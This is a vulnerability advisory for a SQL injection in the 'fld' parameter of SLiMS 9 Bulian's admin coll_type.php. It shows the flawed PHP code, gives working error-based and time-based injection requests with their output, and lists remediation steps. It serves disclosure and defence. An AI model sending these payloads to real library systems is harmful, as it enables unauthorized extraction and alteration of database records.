# CVE-2025-25403 Vulnerability Report

## Overview
- **CVE ID**: CVE-2025-25403
- **Affected Software**: SLiMS (Senayan Library Management Systems) 9 Bulian
- **Affected Version**: V9.6.1
- **Vulnerability Type**: SQL Injection (CWE-89)
- **CVSS Score**: 9.8 (Critical)

## Vulnerability Details

### Location
- **File**: `admin/modules/master_file/coll_type.php`
- **Parameter**: `fld` (GET)
- **Authentication**: Required (Admin)

### Root Cause
The vulnerability stems from improper input sanitization in the following code (line 215-216):

```php
if (isset($_GET['fld']) AND isset($_GET['dir'])) {
    $datagrid->setSQLorder("'".urldecode($_GET['fld'])."' ".$dbs->escape_string($_GET['dir']));
}
```

The `fld` parameter is only URL-decoded but not properly escaped before being inserted into the SQL ORDER BY clause.

## Proof of Concept

### Verified Exploitation Methods

**1. Error-Based SQL Injection**
```
GET /slims/admin/modules/master_file/coll_type.php?fld=' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -&dir=1
```
Result: Extracted database version `10.5.29-MariaDB-ubu2004`

**2. Time-Based Blind SQL Injection**
```
GET /slims/admin/modules/master_file/coll_type.php?fld=' OR SLEEP(3)-- -&dir=1
```
Result: Response delayed by 9+ seconds (SLEEP executed multiple times)

### Extracted Information
- **Database Version**: 10.5.29-MariaDB-ubu2004
- **Database User**: slims@172.23.0.3

## Impact
An authenticated attacker with admin access can:
1. Extract sensitive data from the database (users, passwords, etc.)
2. Modify or delete database records
3. Potentially execute system commands (depending on database privileges)
4. Compromise the entire application

## Remediation
1. Use parameterized queries or prepared statements
2. Apply proper input validation and sanitization to all user inputs
3. Update to a patched version when available

## References
- [GitHub Issue #273](https://github.com/slims/slims9_bulian/issues/273)
- [NVD CVE-2025-25403](https://nvd.nist.gov/vuln/detail/CVE-2025-25403)
